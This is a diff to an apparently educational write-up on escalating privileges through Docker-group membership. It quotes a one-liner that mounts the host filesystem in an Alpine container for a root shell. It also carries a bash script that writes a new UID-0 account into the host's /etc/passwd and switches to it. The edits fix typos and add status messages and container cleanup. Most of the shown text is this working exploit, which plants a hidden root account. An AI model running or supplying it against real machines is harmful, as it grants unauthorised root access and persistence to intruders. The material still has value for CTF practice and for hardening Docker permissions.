@@ -114,7 +114,7 @@ There are some inputs about Docker [here](https://gtfobins.github.io/gtfobins/do
 Let's take a look to the command used to to get an interactive shell:     
 **`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`**
 
-The container is based on Alpine, a lightweight linux disctribution, and the root directory "/" is accessible in the "/mnt" directory. It also spawns a shell and if you type "id" you will see you are granted with root privileges... although you are still in the container, not in the host machine.    
+The container is based on Alpine, a lightweight linux distribution, and the root directory "/" is accessible in the "/mnt" directory. It also spawns a shell and if you type "id" you will see you are granted with root privileges... although you are still in the container, not in the host machine.    
 But hey, if you are trying to get the root flag in a CTF, you have it. 
 
 * * * 
@@ -176,7 +176,7 @@ Now let's put this down in a bash script:
 docker_test=$( docker ps | grep "CONTAINER ID" | cut -d " " -f 1-2 ) 
 
 if [ "$docker_test" == "CONTAINER ID" ]; then
-    echo 'Please write down your new root credentials.'
+	echo 'Please write down your new root credentials.'
     read -p 'Choose a root user name: ' rootname
     read -s -p 'Choose a root password: ' passw
     echo ""
@@ -186,11 +186,12 @@ if [ "$docker_test" == "CONTAINER ID" ]; then
     echo -e "$rootname:$hpass:0:0:root:/root:/bin/bash" > new_account
     mv new_account /tmp/new_account
     docker run -tid -v /:/mnt/ --name flast101.github.io alpine # CHANGE THIS IF NEEDED
-    sleep 1; echo 'Please wait...'; sleep 1; echo '...'; sleep 1; echo '...';
+    sleep 1; echo 'Please wait...'; sleep 1; echo 'Running coker container...'; sleep 1; echo 'Creating root user...';
     docker exec -ti flast101.github.io sh -c "cat /mnt/tmp/new_account >> /mnt/etc/passwd"
-    sleep 1
+    sleep 1; echo '...';
     
-    echo 'Success! Enter you password to use your root account:'
+    echo 'Success! Root user ready. Enter your password to login as root:'
+    docker rm -f flast101.github.io
     rm /tmp/new_account
     su $rootname
 
@@ -199,7 +200,7 @@ elif [ $(id -u) -eq 0 ]; then
     exit
 
 else echo "Your account does not have permission to execute docker, aborting..."
-    exit
+	exit
 
 fi
 ```
